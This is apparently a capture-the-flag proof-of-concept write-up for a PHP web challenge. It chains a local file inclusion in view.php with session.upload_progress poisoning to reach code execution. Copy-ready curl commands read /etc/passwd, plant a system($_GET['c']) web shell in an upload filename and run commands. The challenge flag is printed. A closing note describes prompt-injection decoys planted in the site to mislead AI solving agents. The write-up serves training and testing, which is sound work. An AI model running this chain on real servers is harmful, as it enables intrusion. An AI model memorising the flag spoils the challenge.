# PoC: Persistence

## TL;DR

- `upload.php` is genuinely hardened, so the uploaded file itself is a dead end.
- `view.php?article=` is a local file inclusion (`include`), but absolute paths
  and protocol wrappers (`php://`, `phar://`, ...) are blocked. `..` still works.
- PHP's `session.upload_progress` feature writes the raw multipart request
  (including the uploaded **filename**) into the session file. The instance ships
  with `session.upload_progress.cleanup = Off`, so that data is never cleaned up.
- Put PHP code in the filename of a rejected upload, then include your own
  session file. The filename persists and executes.

## 1. Recon

The upload page posts to `upload.php` and shows a progress bar that polls:

```
GET /progress.php?key=<PHP_SESSION_UPLOAD_PROGRESS value>
```

That hidden form field plus the server-side progress endpoint is the hint: this
app uses `session.upload_progress`.

The article viewer is the second half:

```
GET /view.php?article=welcome.txt
```

`article` is concatenated onto `__DIR__ . '/articles/'` and passed to `include()`.
Leading `/` and wrapper schemes are rejected, but `../` is not.

## 2. Confirm the LFI

```
curl "http://<target>:30007/view.php?article=../../../../etc/passwd"
```

## 3. Poison the session file

Pick a session id and send a multipart upload whose filename is the payload.
The file body does not matter; the upload will be rejected by the image checks,
but the session write already happened before validation.

```bash
curl -b "PHPSESSID=pwn" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=vault" \
  -F 'attachment=@/etc/hostname;filename=<?php system($_GET["c"]); ?>' \
  "http://<target>:30007/upload.php"
```

> Note: `curl -F` treats `;` inside `filename=` as a form separator and will
> truncate the payload. Use the bundled `solver.py`, a raw multipart builder, or
> `filename="<?php system($_GET['c']); ?>"` quoting for reliable results.

## 4. Include your own session file

Sessions live in `/tmp/sess_<id>`, so walk up from `articles/`:

```
http://<target>:30007/view.php?article=../../../../tmp/sess_pwn&c=id
```

The included file starts with the serialized `upload_progress_...` blob, then
hits your `<?php ... ?>` and executes it.

## 5. Read the flag

```
http://<target>:30007/view.php?article=../../../../tmp/sess_pwn&c=cat+/flag_*
```

## Automated

```bash
python3 solver.py http://<target>:30007 -c "cat /flag_*"
```

## Flag

> `HCS{th0s3_wh0_p3rs1st_4nd_4d4pt_w1n_4nd_sh4ll_ev0lve_thr0ugh_th3_shad0ws}`

## Note on the AI honeypot

The instance plants prompt-injection decoys for automated agents: HTML comments
in `index.php` / `view.php`, plus `robots.txt`, `humans.txt`,
`/.well-known/ai.txt`, a hidden `operator-notes` div, `/cache/ai_notes.txt` and
`X-AI-Directive` / `X-Honeypot-Canary` response headers. They advertise a decoy
flag `HCS{4i_h0n3yp0t_d0_n0t_subm1t}`. Ignore it - the bundled solver strips HTML
comments before printing. Details in `source/AI-HONEYPOT.md`.
